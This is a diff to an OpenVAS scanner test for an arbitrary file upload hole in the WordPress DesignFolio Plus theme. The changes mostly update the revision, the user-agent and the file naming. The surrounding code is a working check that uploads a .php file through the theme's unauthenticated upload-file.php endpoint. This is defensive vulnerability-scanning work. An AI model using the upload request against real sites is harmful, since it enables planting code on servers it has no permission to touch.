@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
+# $Id: gb_wordpress_designfolio_arbit_file_upload_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
 #
 # Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805156");
-  script_version("$Revision: 11424 $");
+  script_version("$Revision: 11492 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-18 14:31:11 +0530 (Wed, 18 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Wordpress DesignFolio Plus Theme Arbitrary File Upload Vulnerability");
@@ -70,6 +70,7 @@ General solution options are to upgrade to a newer release, disable respective f
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
@@ -83,12 +84,14 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
 url = dir + '/wp-content/themes/designfolio-plus/admin/upload-file.php';
 wpReq = http_get(item: url,  port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);
+vtstring = get_vt_string( lowercase:TRUE );
+useragent = get_http_user_agent();
 
 if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 {
   index = eregmatch(pattern:'Undefined index: ([0-9a-z]+) in', string:wpRes);
 
-  fileName = 'openvas_' + rand() + '.php';
+  fileName = vtstring + '_' + rand() + '.php';
 
   postData = string('------------7nLRJ4OOOKgWZky9bsIqMS\r\n',
                     'Content-Disposition: form-data; name="', index[1], '"; filename="', fileName, '"\r\n',
@@ -100,7 +103,7 @@ if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
 
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
                   "Host: ", get_host_name(), "\r\n",
-                  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+                  "User-Agent: ", useragent, "\r\n",
                   "Content-Length: ", strlen(postData), "\r\n",
                   "Content-Type: multipart/form-data; boundary=----------7nLRJ4OOOKgWZky9bsIqMS\r\n\r\n",
                   postData, "\r\n");
